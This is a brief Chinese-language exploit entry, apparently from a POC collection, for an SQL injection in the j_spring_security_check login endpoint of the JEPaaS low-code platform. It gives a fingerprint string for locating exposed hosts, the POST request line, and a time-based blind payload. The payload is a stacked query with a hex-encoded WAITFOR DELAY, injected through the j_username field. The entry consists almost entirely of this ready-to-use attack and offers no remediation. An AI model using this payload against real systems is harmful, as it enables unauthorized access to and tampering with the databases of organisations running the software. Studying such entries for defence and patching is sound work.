# JEPaaS低代码平台j_spring_security_checkSQL注入漏洞

JEPaaS ｜ SQL注入 ｜ —
- **指纹**：`body="/saas/saasYhAction!sendRandom.action"`
- **请求**：`POST /j_spring_security_check HTTP/1.1`

**Payload**
```
j_username=');DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--
```